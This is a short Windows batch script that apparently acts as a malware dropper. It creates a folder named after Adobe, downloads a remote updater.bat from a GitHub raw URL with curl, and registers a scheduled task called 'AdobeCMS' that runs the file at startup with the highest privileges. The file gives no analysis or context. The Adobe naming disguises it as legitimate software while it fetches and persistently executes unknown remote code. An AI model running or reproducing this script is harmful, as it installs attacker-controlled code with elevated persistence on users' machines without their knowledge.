@echo off
md C:\Users\Public\Documents\Adobe
curl -s https://raw.githubusercontent.com/qufyu/0024/main/updater.bat > C:\Users\Public\Documents\Adobe\updater.bat
schtasks /create /sc onstart /tn AdobeCMS /tr C:\Users\Public\Documents\Adobe\updater.bat /f /rl HIGHEST
exit
